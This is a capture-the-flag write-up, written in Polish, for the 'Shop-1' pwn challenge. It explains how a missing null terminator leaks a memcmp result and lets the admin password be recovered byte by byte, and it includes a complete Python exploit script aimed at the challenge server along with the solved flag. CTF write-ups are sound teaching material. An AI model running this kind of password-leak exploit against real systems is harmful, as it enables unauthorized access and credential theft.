## Shop-1 (pwn, 100p, 34 solves)

> Our marvelous Bragisdumus shop just opened. Come and see [our beautiful Bragisdumus](bragisdumu-shop)!  
> Login as an admin! get the admin password.  
> nc 185.106.120.220 1337

### PL
[ENG](#eng-version)

Z zadaniem otrzymujemy binarkę serwera usługi typu CRUD z wpisami w pamięci procesu. Zgodnie z opisem celem pierwszej części jest zdobycie hasła administratora. Możemy również zalogować się na gościa z loginem i hasłem "guest".

W głównej funkcji programu widzimy, że hasło administratora od momentu wczytania go z pliku "żyje" bardzo krótko:

```c
password = sub_FB5("adminpass.txt", &length);
result = memcmp(input_password, password, length);
free(password);
```

Sama funkcja wczytująca hasło z pliku wydaje się w porządku. W takim razie sprawdźmy co z wynikiem `memcmp`, a konkretnie gdzie na stosie znajduje się zmienna `result`.

```c
char input_login[32]; // [bp-70h]
char input_password[64]; // [bp-50h]
int result; // [bp-10h]
```

Widzimy zatem, że zaraz za buforami na wprowadzony login i hasło.

```c
printf("Logged in as %s\n\n", input_login);
```

Wprowadzony login jest również wypisywany. Może nam to sugerować, że chodzić może o wyciek `result`. Zwłaszcza, że w funkcji wczytującej tekst nie widzimy wstawienia null-byte'a na koniec. Musimy więc wysłać przynajmniej 32 znaki w loginie i 64 w haśle.

Wynik `memcmp` w naszym przypadku to dokładna różnica pomiędzy pierwszymi różniącymi się bajtami. Możemy zatem znak po znaku wyciągnąć hasło.

```python
import pwnlib
#host = 'localhost'
host = '185.106.120.220'

client = pwnlib.tubes.remote.remote(host, 1337)

def login(username, password):
	client.recvuntil('Username: ')
	client.sendline(username)
	client.recvuntil('Password: ')
	client.sendline(password)

password = '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'

for i in range(38):
	login('adminxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', password)
	login('guest', 'guest')
	n = int(client.recvlines(2)[1][109:].encode('hex'), 16)
	password = password[:i] + chr(ord(password[i]) - n) + password[i + 1:]
	client.sendline('8')
	print password
```

Hasło oraz flaga to `ASIS{304b0f16eb430391c6c86ab0f3294211}`.
